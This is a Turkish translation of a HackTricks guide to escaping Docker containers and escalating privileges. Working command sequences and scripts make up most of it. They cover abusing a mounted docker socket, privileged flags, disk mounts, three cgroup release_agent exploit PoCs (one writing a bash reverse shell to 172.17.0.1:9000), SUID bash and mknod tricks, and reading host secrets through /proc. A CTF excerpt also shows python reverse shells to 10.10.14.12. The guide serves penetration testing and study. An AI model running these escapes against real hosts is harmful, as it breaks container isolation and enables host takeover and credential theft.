# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Otomatik Sayım & Kaçış

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Ayrıca **konteynerleri sayabilir**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Bu araç, bulunduğunuz konteyneri saymak ve otomatik olarak kaçış denemeleri yapmak için oldukça **yararlıdır**
- [**amicontained**](https://github.com/genuinetools/amicontained): Kaçış yollarını bulmak için konteynerin sahip olduğu ayrıcalıkları elde etmek için yararlı bir araç
- [**deepce**](https://github.com/stealthcopter/deepce): Konteynerlerden sayım yapmak ve kaçış sağlamak için bir araç
- [**grype**](https://github.com/anchore/grype): Görüntüde yüklü yazılımlarda bulunan CVE'leri almak için

## Montelenmiş Docker Soketi Kaçışı

Eğer bir şekilde **docker soketinin** docker konteyneri içinde montelendiğini bulursanız, oradan kaçış yapabileceksiniz.\
Bu genellikle, bir nedenle docker daemon ile bağlantı kurması gereken docker konteynerlerinde olur.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Bu durumda, docker daemon ile iletişim kurmak için normal docker komutlarını kullanabilirsiniz:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> Eğer **docker soketi beklenmedik bir yerdeyse** yine de **`docker`** komutunu **`-H unix:///path/to/docker.sock`** parametresi ile kullanarak onunla iletişim kurabilirsiniz.

Docker daemon ayrıca [bir portta dinliyor olabilir (varsayılan olarak 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) veya Systemd tabanlı sistemlerde, Docker daemon ile iletişim Systemd soketi `fd://` üzerinden gerçekleşebilir.

> [!NOTE]
> Ayrıca, diğer yüksek seviyeli çalışma zamanlarının çalışma soketlerine dikkat edin:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Yeteneklerin Kötüye Kullanımı ile Kaçış

Konteynerin yeteneklerini kontrol etmelisiniz, eğer aşağıdakilerden herhangi birine sahipse, ondan kaçış yapabilirsiniz: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Mevcut konteyner yeteneklerini **daha önce bahsedilen otomatik araçlar** ile veya kontrol edebilirsiniz:
```bash
capsh --print
```
Aşağıdaki sayfada **linux yetenekleri hakkında daha fazla bilgi edinebilir** ve bunları nasıl kötüye kullanarak yetki kaçışı/yükseltmesi yapabileceğinizi öğrenebilirsiniz:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Yetkili Konteynerlerden Kaçış

Yetkili bir konteyner, `--privileged` bayrağı ile veya belirli savunmaları devre dışı bırakarak oluşturulabilir:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

`--privileged` bayrağı, konteyner güvenliğini önemli ölçüde azaltır, **kısıtlamasız cihaz erişimi** sunar ve **birçok korumayı** atlatır. Detaylı bir inceleme için `--privileged`'in tam etkileri ile ilgili belgeleri inceleyin.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Yetkili + hostPID

Bu izinlerle, sadece **root olarak ana makinede çalışan bir sürecin ad alanına geçebilirsiniz**; örneğin init (pid:1) sadece şunu çalıştırarak: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Bunu bir konteynerde test edin:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Ayrıcalıklı

Sadece ayrıcalıklı bayrağı ile **ana bilgisayarın diskine erişmeye** veya **release_agent veya diğer kaçışları kötüye kullanarak kaçmaya** çalışabilirsiniz.

Aşağıdaki atlatmaları bir konteynerde çalıştırarak test edin:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Disk Bağlama - Poc1

İyi yapılandırılmış docker konteynerleri **fdisk -l** gibi komutlara izin vermez. Ancak, `--privileged` veya büyük harfle belirtilmiş `--device=/dev/sda1` bayrağı ile yanlış yapılandırılmış bir docker komutunda, ana makine sürücüsünü görme ayrıcalıklarını elde etmek mümkündür.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Bu nedenle, ana makineyi ele geçirmek oldukça basittir:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Ve işte! Artık ana makinenin dosya sistemine erişebilirsiniz çünkü `/mnt/hola` klasörüne monte edilmiştir.

#### Disk Montajı - Poc2

Konteyner içinde, bir saldırgan, küme tarafından oluşturulan yazılabilir bir hostPath hacmi aracılığıyla altındaki ana işletim sistemine daha fazla erişim sağlamaya çalışabilir. Aşağıda, bu saldırgan vektörünü kullanıp kullanamayacağınızı görmek için konteyner içinde kontrol edebileceğiniz bazı yaygın şeyler bulunmaktadır:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Yetki Kaçırma Mevcut release_agent'i istismar etme ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Yetki Kaçırma, oluşturulan release_agent'i istismar etme ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Yetkili Kaçış release_agent'i göreli yolu bilmeden istismar etme - PoC3

Önceki istismarlar da **konteynerin ana bilgisayarın dosya sistemindeki mutlak yolu ifşa edilmiştir**. Ancak, bu her zaman böyle değildir. Ana bilgisayar içindeki konteynerin **mutlak yolunu bilmediğiniz durumlarda** bu tekniği kullanabilirsiniz:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Yetkili bir konteyner içinde PoC'yi çalıştırmak, aşağıdakine benzer bir çıktı sağlamalıdır:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Ayrıcalıklı Kaçış Hassas Montajların İstismarı

Montaj yapılmış birkaç dosya vardır ki bunlar **altındaki ana makine hakkında bilgi verir**. Bunlardan bazıları, **bir şey olduğunda ana makine tarafından yürütülecek bir şeyi gösterebilir** (bu, bir saldırganın konteynerden kaçmasına izin verecektir).\
Bu dosyaların istismarı şunları mümkün kılabilir:

- release_agent (daha önce ele alındı)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Ancak, bu sayfada kontrol edilecek **diğer hassas dosyalar** bulabilirsiniz:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Keyfi Montajlar

Birçok durumda, **konteynerin ana makineden bazı hacimlerin montajlı olduğunu** göreceksiniz. Eğer bu hacim doğru bir şekilde yapılandırılmamışsa, **hassas verilere erişim/değişiklik yapma** imkanınız olabilir: Gizli bilgileri okuyun, ssh authorized_keys'i değiştirin…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### İki shell ve host mount ile Yetki Yükseltme

Eğer bir **konteyner içinde root erişiminiz** varsa ve host'tan bazı klasörler mount edilmişse ve **host'a yetkisiz bir kullanıcı olarak kaçtıysanız** ve mount edilmiş klasör üzerinde okuma erişiminiz varsa.\
Konteyner içindeki **mount edilmiş klasörde** bir **bash suid dosyası** oluşturabilir ve **host'tan çalıştırarak** yetki yükseltebilirsiniz.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### İki Shell ile Yetki Yükseltme

Eğer bir **konteyner içinde root olarak erişiminiz** varsa ve **host'a yetkisiz bir kullanıcı olarak kaçtıysanız**, her iki shell'i de **host içinde privesc için kullanabilirsiniz** eğer konteyner içinde MKNOD yeteneğine sahipseniz (bu varsayılan olarak vardır) [**bu yazıda açıklandığı gibi**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Bu yetenekle konteyner içindeki root kullanıcısı **blok cihaz dosyaları oluşturma** iznine sahiptir. Cihaz dosyaları, **altındaki donanım ve çekirdek modüllerine erişmek için** kullanılan özel dosyalardır. Örneğin, /dev/sda blok cihaz dosyası, **sistem diskindeki ham verilere erişim sağlar**.

Docker, konteynerler içinde blok cihaz kötüye kullanımına karşı, **blok cihazı okuma/yazma işlemlerini engelleyen** bir cgroup politikası uygulayarak koruma sağlar. Ancak, eğer bir blok cihaz **konteyner içinde oluşturulursa**, bu cihaz konteyner dışından **/proc/PID/root/** dizini aracılığıyla erişilebilir hale gelir. Bu erişim, **işlem sahibinin hem konteyner içinde hem de dışında aynı olması** gerektirir.

**Sömürü** örneği bu [**yazıdan**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Eğer ana makinenin süreçlerine erişiminiz varsa, bu süreçlerde saklanan birçok hassas bilgiye erişebileceksiniz. Test laboratuvarını çalıştırın:
```
docker run --rm -it --pid=host ubuntu bash
```
Örneğin, `ps auxn` gibi bir şey kullanarak süreçleri listeleyebilir ve komutlarda hassas ayrıntıları arayabilirsiniz.

Daha sonra, **/proc/ içinde ana bilgisayarın her bir sürecine erişebildiğiniz için, sadece env gizli anahtarlarını çalabilirsiniz**:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Diğer süreçlerin dosya tanımlayıcılarına da **erişebilir ve açık dosyalarını okuyabilirsiniz**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Ayrıca **işlemleri sonlandırabilir ve bir DoS oluşturabilirsiniz**.

> [!WARNING]
> Eğer bir şekilde **konteyner dışındaki bir işleme ayrıcalıklı erişiminiz varsa**, `nsenter --target <pid> --all` veya `nsenter --target <pid> --mount --net --pid --cgroup` gibi bir şey çalıştırarak **o işlemin aynı ns kısıtlamalarıyla** (umarım hiç yok) **bir shell çalıştırabilirsiniz.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Eğer bir konteyner Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/) ile yapılandırılmışsa, o konteynerin ağ yığını Docker ana bilgisayarından izole değildir (konteyner, ana bilgisayarın ağ ad alanını paylaşır) ve konteynerin kendi IP adresi tahsis edilmez. Diğer bir deyişle, **konteyner tüm hizmetleri doğrudan ana bilgisayarın IP'sine bağlar**. Ayrıca konteyner, **ana bilgisayarın** paylaşılan arayüzde gönderdiği ve aldığı Tüm ağ trafiğini **yakalayabilir** `tcpdump -i eth0`.

Örneğin, bunu **ana bilgisayar ile metadata örneği arasında trafiği yakalamak ve hatta sahte trafik oluşturmak** için kullanabilirsiniz.

Aşağıdaki örneklerde olduğu gibi:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Ayrıca, ana bilgisayar içinde **localhost'a bağlı ağ hizmetlerine** erişebilecek veya hatta **düğümün metadata izinlerine** erişebileceksiniz (bu, bir konteynerin erişebileceğinden farklı olabilir).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true` ile, ana bilgisayarın süreçler arası iletişim (IPC) kaynaklarına, örneğin `/dev/shm` içindeki **paylaşılan bellek** kaynaklarına erişim kazanırsınız. Bu, aynı IPC kaynaklarının diğer ana bilgisayar veya pod süreçleri tarafından kullanıldığı yerlerde okuma/yazma yapmanıza olanak tanır. Bu IPC mekanizmalarını daha fazla incelemek için `ipcs` komutunu kullanın.

- **/dev/shm'yi incele** - Bu paylaşılan bellek konumundaki dosyaları kontrol edin: `ls -la /dev/shm`
- **Mevcut IPC tesislerini incele** – Herhangi bir IPC tesisinin kullanılıp kullanılmadığını kontrol etmek için `/usr/bin/ipcs` komutunu kullanabilirsiniz. Bunu kontrol edin: `ipcs -a`

### Yetenekleri geri kazanma

Eğer sistem çağrısı **`unshare`** yasaklanmamışsa, tüm yetenekleri geri kazanabilirsiniz:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Kullanıcı ad alanı istismarı yoluyla symlink

Gönderide açıklanan ikinci teknik [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) kullanıcı ad alanları ile bind mount'ları nasıl istismar edebileceğinizi, host içindeki dosyaları etkilemek için (bu özel durumda, dosyaları silmek) göstermektedir.

## CVE'ler

### Runc istismarı (CVE-2019-5736)

Eğer `docker exec` komutunu root olarak çalıştırabiliyorsanız (muhtemelen sudo ile), CVE-2019-5736'dan yararlanarak bir konteynerden kaçış yaparak ayrıcalıkları yükseltmeye çalışırsınız (istismar [burada](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Bu teknik temelde **/bin/sh** ikili dosyasını **host**'tan **bir konteyner** aracılığıyla **üst üste yazacaktır**, bu nedenle docker exec komutunu çalıştıran herkes yükü tetikleyebilir.

Yükü buna göre değiştirin ve `go build main.go` ile main.go dosyasını derleyin. Ortaya çıkan ikili dosya, yürütme için docker konteynerine yerleştirilmelidir.\
Yürütme sırasında, `[+] /bin/sh başarıyla üst üste yazıldı` mesajını gösterdiği anda, host makinesinden aşağıdakini çalıştırmalısınız:

`docker exec -it <container-name> /bin/sh`

Bu, main.go dosyasında bulunan yükü tetikleyecektir.

Daha fazla bilgi için: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Konteynerin savunmasız olabileceği diğer CVE'ler de vardır, bir listeyi [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) adresinde bulabilirsiniz.

## Docker Özel Kaçış

### Docker Kaçış Yüzeyi

- **Ad Alanları:** Süreç, ad alanları aracılığıyla **diğer süreçlerden tamamen ayrılmış olmalıdır**, bu nedenle ad alanları nedeniyle diğer süreçlerle etkileşimde bulunarak kaçış yapamayız (varsayılan olarak IPC'ler, unix soketleri, ağ hizmetleri, D-Bus, diğer süreçlerin `/proc`'u aracılığıyla iletişim kuramaz).
- **Root kullanıcı**: Varsayılan olarak süreci çalıştıran kullanıcı root kullanıcısıdır (ancak ayrıcalıkları sınırlıdır).
- **Yetenekler**: Docker aşağıdaki yetenekleri bırakır: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Sistem çağrıları**: **Root kullanıcısının çağıramayacağı** sistem çağrılarıdır (yeteneklerin eksikliği + Seccomp nedeniyle). Diğer sistem çağrıları kaçış yapmaya çalışmak için kullanılabilir.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
